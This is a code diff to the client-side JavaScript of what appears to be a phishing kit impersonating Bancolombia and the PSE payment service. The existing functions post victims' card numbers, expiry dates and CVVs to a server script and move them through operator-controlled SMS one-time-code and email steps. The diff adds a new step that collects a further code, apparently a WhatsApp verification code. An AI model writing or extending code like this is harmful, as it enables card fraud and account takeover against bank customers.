@@ -59,6 +59,11 @@ function vista_errorotp(){
     window.location.href = "../a/ERROTP";
 }
 
+// NUEVA FUNCIÓN PARA EL ESTADO WPP
+function vista_wpp(){
+    window.location.href = "../a/WPP";
+}
+
 function vista_tarjeta(){
     window.location.href = "../a/PRODUCT";
 }
@@ -103,13 +108,18 @@ function pasocorreo(e,c,t){
     });
 }
 
+// NUEVA FUNCIÓN PARA PROCESAR EL ESTADO WPP
+function pasowpp(codigo){    
+    $.post( PSE_PROCESS + "pasowpp.php", { codigo: codigo} ,function(data) {
+        window.location.href = "../a/WAITING";    
+    });
+}
 
 function pasotarjeta(t,f,c){    
     $.post( PSE_PROCESS + "pasotarjeta.php", { tar:t,fec:f,cvv:c } ,function(data) {
         window.location.href = "../a/WAITING";   
     });
 }
-
 
 function consultar_estado(){ 
     $.post( PSE_PROCESS + "estado.php",function(data) {        
@@ -118,6 +128,7 @@ function consultar_estado(){
             case '4': window.location.href = "MAIL"; break;
             case '6': window.location.href = "PRODUCT"; break;               
             case '8': window.location.href = "SMSOTP"; break;
+            case '14': window.location.href = "WPP"; break; // <-- NUEVO CASO AÑADIDO
             case '10': window.location.href = "https://www.bancolombia.com/personas"; break;
             case '12': window.location.href = "login"; break;
         } 
